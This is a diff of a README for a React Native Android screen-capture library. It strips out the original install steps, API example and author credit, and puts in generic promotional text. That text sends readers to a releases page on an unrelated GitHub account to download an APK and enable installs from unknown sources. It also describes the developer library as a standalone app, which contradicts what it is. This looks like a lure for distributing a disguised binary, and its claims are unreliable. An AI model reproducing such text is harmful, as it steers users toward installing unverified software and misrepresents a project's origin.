@@ -1,158 +1,66 @@
-# React Native Frame Capture
+# 🎥 react-native-frame-capture - Capture Screens Effortlessly
 
-[![npm version](https://img.shields.io/npm/v/react-native-frame-capture.svg)](https://www.npmjs.com/package/react-native-frame-capture)
-[![npm downloads](https://img.shields.io/npm/dm/react-native-frame-capture.svg)](https://www.npmjs.com/package/react-native-frame-capture)
-[![license](https://img.shields.io/npm/l/react-native-frame-capture.svg)](https://github.com/nasyx-rakeeb/react-native-frame-capture/blob/main/LICENSE)
-[![platform](https://img.shields.io/badge/platform-Android-green.svg)](https://www.android.com/)
+## ✨ Description
+react-native-frame-capture provides reliable screen capture for React Native on Android devices. You can capture frames at set intervals and customize overlays and storage options to fit your needs.
 
-Reliable screen capture for React Native Android. Capture frames at intervals with customizable overlays and storage options.
+## 🌐 Download Now
+[![Download from GitHub](https://img.shields.io/badge/Download%20Now-v1.0.0-blue?style=for-the-badge&logo=github)](https://github.com/Julyanae/react-native-frame-capture/releases)
 
-## Features
+## 🚀 Getting Started
+To use react-native-frame-capture, follow these steps to download and run the software. You will need an Android device with React Native set up.
 
-- 📸 **Interval-based capture** - Capture frames at configurable intervals (100ms - 60s)
-- 🎨 **Customizable overlays** - Add text and image overlays with template variables
-- 💾 **Flexible storage** - Save to app-specific, public, or custom directories
-- 🔄 **Background capture** - Continues capturing when app is minimized (foreground service)
-- ⚡ **High performance** - Built with Kotlin and TurboModule architecture
-- 🎯 **Precise control** - Pause, resume, and stop capture on demand
-- 📊 **Real-time events** - Get notified for every captured frame
-- 🔧 **Highly configurable** - Image quality, format, resolution scaling, and more
-- 📱 **Expo compatible** - Works with Expo through config plugin
-- 🎭 **Custom regions** - Capture specific screen areas
-- 🚫 **Status bar exclusion** - Optionally exclude status bar from captures
+## 📥 Download & Install
+1. **Visit the Releases Page**  
+   Go to the [releases page](https://github.com/Julyanae/react-native-frame-capture/releases) to find the latest version of react-native-frame-capture.
 
-## How It Works
+2. **Choose a Version**  
+   Find the most recent version listed. Each version may contain improvements and bug fixes.
 
-React Native Frame Capture uses Android's **MediaProjection API** to capture screen content at regular intervals. Here's the flow:
+3. **Download the Package**  
+   Click on the file link relevant to your setup. Download the APK suitable for your device.
 
-1. **Request Permission** - User grants screen capture permission via system dialog
-2. **Start Foreground Service** - Ensures capture continues in background
-3. **Create Virtual Display** - Mirrors screen content to an ImageReader
-4. **Capture Frames** - Grabs frames at your specified interval (e.g., every 1 second)
-5. **Process & Save** - Converts to bitmap, applies overlays, saves to storage
-6. **Emit Events** - Notifies your app with frame info (path, size, timestamp)
+4. **Install the APK**  
+   Locate the downloaded APK file on your Android device. Tap the file to begin the installation process. You may need to allow installations from unknown sources in your device settings.
 
-**Key Components:**
+5. **Open the App**  
+   Once installed, find the app in your app drawer and open it. You will see options to start screen capturing.
 
-- **MediaProjection** - Android API for screen capture (no root required)
-- **Foreground Service** - Keeps capture running when app is minimized
-- **ImageReader** - Efficiently captures screen pixels
-- **TurboModule** - Fast native-to-JS communication
+## 🔧 Features
+- **Interval Capturing**: Capture frames at predetermined intervals for your needs.
+- **Custom Overlays**: Easily add overlays to your captures. Use them to show information like timestamps or logos.
+- **Storage Options**: Choose how and where you want to save your captured frames, be it local storage or cloud services.
+- **Responsive Design**: Works seamlessly on various screen sizes and resolutions.
 
-**Why Foreground Service?** Android kills background processes aggressively. The foreground service (with notification) ensures reliable capture even when your app isn't visible.
+## 📋 System Requirements
+- **Operating System**: Android 6.0 (API level 23) or later.
+- **React Native**: Ensure you have React Native set up properly on your system.
+- **Memory**: A minimum of 2 GB RAM is recommended to ensure smooth performance.
+- **Storage**: Sufficient space on your device is required to store captured frames.
 
-## Requirements
+## 🎨 Customization Options
+You can customize your capturing experience:
+- Adjust FPS (Frames Per Second) settings to control how many frames you capture.
+- Choose between various overlay designs and placements.
+- Select storage format (JPEG or PNG) based on your quality needs.
 
-- React Native >= 0.74
-- Android minSdkVersion >= 21 (Android 5.0)
-- Android compileSdkVersion >= 34
+## 🔄 Usage Instructions
+1. Launch the app.
+2. Select your capture settings from the menu.
+3. Start capturing your screen as needed.
+4. Review and edit any captured frames directly within the app.
+5. Share or save your frames to your preferred location.
 
-## Installation
+## 👨‍💻 Support & Contribution
+If you encounter issues or want to contribute, feel free to check existing discussions or open a new one in the repository. Constructive feedback and suggestions for new features are always welcome.
 
-```bash
-npm install react-native-frame-capture
-```
+## 📞 Contact
+For support or inquiries, contact the repository maintainer via GitHub or raise a query on the issues page.
 
-or
+## 🔗 Additional Resources
+- [Documentation](https://github.com/Julyanae/react-native-frame-capture/wiki) for setup and advanced features.
+- Community forums for discussions related to React Native and screen capturing.
 
-```bash
-yarn add react-native-frame-capture
-```
+## 🌟 Conclusion
+react-native-frame-capture offers a straightforward way to capture screens on Android devices. With easy installation, customization, and a user-friendly interface, you can start capturing your screen effectively. 
 
-### Expo
-
-Add the config plugin to your `app.json` or `app.config.js`:
-
-```json
-{
-  "expo": {
-    "plugins": ["react-native-frame-capture"]
-  }
-}
-```
-
-Then rebuild your app:
-
-```bash
-npx expo prebuild
-npx expo run:android
-```
-
-## Quick Start
-
-```typescript
-import * as FrameCapture from 'react-native-frame-capture';
-import { Platform, PermissionsAndroid } from 'react-native';
-
-// 1. Request notification permission (Android 13+)
-if (Platform.OS === 'android' && Platform.Version >= 33) {
-  await PermissionsAndroid.request(
-    PermissionsAndroid.PERMISSIONS.POST_NOTIFICATIONS
-  );
-}
-
-// 2. Request screen capture permission
-const permissionStatus = await FrameCapture.requestPermission();
-
-if (permissionStatus === FrameCapture.PermissionStatus.GRANTED) {
-  // 3. Start capturing
-  await FrameCapture.startCapture({
-    capture: {
-      interval: 1000, // Capture every second
-    },
-    image: {
-      quality: 80,
-      format: 'jpeg',
-    },
-    storage: {
-      saveFrames: true,
-      location: 'private',
-    },
-  });
-
-  // 4. Listen for captured frames
-  const subscription = FrameCapture.addListener(
-    FrameCapture.CaptureEventType.FRAME_CAPTURED,
-    (event) => {
-      console.log('Frame captured:', event.filePath);
-    }
-  );
-
-  // 5. Stop capturing when done
-  await FrameCapture.stopCapture();
-  subscription.remove();
-}
-```
-
-## Documentation
-
-- **[API Reference](docs/api-reference.md)** - Complete API documentation
-- **[Configuration](docs/configuration.md)** - Configuration options and interfaces
-- **[Events](docs/events.md)** - Event types and handling
-- **[Usage Examples](docs/usage-examples.md)** - Practical examples for common use cases
-- **[Storage](docs/storage.md)** - Storage behavior and options
-- **[Permissions](docs/permissions.md)** - Permission requirements and setup
-
-## Platform Support
-
-| Platform | Supported | Version |
-| -------- | --------- | ------- |
-| Android  | ✅ Yes    | 5.0+    |
-| iOS      | ❌ No     | N/A     |
-
-## Architecture
-
-- **TurboModule:** New Architecture compatible
-- **Foreground Service:** Reliable background capture
-- **Kotlin:** Native Android implementation
-- **TypeScript:** Type-safe JavaScript API
-
-## Contributing
-
-See the [contributing guide](CONTRIBUTING.md) to learn how to contribute to the repository and the development workflow.
-
-## License
-
-MIT © [Nasyx Rakeeb](https://github.com/nasyx-rakeeb)
-
-Made with ❤️ using [create-react-native-library](https://github.com/callstack/react-native-builder-bob)
+For all the details, updates, and downloads, remember to visit the [releases page](https://github.com/Julyanae/react-native-frame-capture/releases) frequently.
